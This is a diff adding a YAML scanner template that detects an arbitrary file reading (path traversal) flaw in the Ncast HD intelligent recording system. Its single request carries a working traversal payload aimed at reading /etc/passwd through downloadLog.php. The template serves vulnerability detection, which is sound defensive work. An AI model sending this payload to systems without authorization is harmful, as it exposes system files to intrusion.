@@ -1,0 +1,23 @@
+id: ncast-lfi
+brief:
+    title: Ncast HD Intelligent Recording - Arbitrary File Reading
+    by: pussycat0x
+    level: high
+    about: Ncast HD intelligent recording and broadcasting system has an arbitrary file reading vulnerability.
+    label:
+        - ncast
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/developLog/downloadLog.php?name=../../../../etc/passwd'
+      signs:
+        - "on": word
+          has:
+            - application/force-download
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
